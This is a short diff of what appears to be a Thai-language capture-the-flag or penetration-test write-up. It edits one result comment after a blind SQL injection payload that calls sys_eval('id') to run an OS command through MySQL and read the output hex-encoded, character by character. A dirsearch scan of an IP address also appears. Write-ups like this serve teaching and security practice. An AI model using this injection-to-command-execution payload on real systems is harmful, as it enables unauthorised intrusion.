@@ -123,7 +123,7 @@ dirsearch -u http://35.240.216.137/
 1' AND '{text}' = (select substr((select hex(select sys_eval('id'))),{index},1)) #
 
 # Result
-สำเร็จ encode hex ออกมาได้ผลลัพท์ของ command : id เป็น user mysql
+สำเร็จ ทำการ decode hex ออกมาได้ผลลัพท์ user ชื่อ mysql
 ```
 <img src="./resources/51.png" alt="" style="width:80% !important;">
 <img src="./resources/52.png" alt="" style="width:80% !important;">
